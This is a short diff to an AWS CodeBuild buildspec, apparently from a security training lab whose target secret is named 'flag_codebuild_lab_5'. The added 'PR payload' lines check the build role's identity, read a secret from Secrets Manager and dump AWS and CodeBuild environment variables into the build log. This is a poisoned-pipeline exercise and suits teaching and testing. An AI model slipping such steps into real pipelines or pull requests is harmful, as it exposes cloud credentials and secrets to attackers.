@@ -3,6 +3,8 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
+      - echo "Running PR payload"
+      - aws sts get-caller-identity || true
+      - aws secretsmanager get-secret-value --region us-east-1 --secret-id flag_codebuild_lab_5 --query SecretString --output text || true
+      - env | grep -E '^AWS_|CODEBUILD'
       - echo "Done"
